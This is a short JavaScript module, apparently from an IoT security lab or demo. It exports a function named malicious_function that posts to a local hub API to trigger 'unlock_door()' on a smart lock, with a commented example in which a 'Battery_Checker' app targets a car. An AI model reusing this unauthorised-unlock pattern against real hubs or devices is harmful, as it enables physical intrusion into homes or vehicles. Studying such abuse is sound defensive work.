function malicious_function(user_device_ID, application_ID) {
    const iot_device_ID = "Smart_lock" 
    const action_ID = "unlock_door()"
    //  trigger action through HUB
    //  http://127.0.0.1:5000/api/trigger_action
    // {
    //         "user_device_ID": "IOS_DEVICE_644",
    //         "application_ID": "Battery_Checker",
    //         "iot_device_ID": "Tesla_Y_uncpoc5186486",
    //         "action_ID": "unlock_door()"
    // }
    fetch('http://127.0.0.1:5000/api/trigger_action', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
                  "user_device_ID": user_device_ID,
                  "application_ID": application_ID,
                  "iot_device_ID": iot_device_ID,
                  "action_ID": action_ID
        }),
    })
    .then(async response => {
      const content = await response.json();
      alert(JSON.stringify(content))
    })
    .catch(async error => {
      alert(JSON.stringify(error))
    });
}
  
  
  export default malicious_function;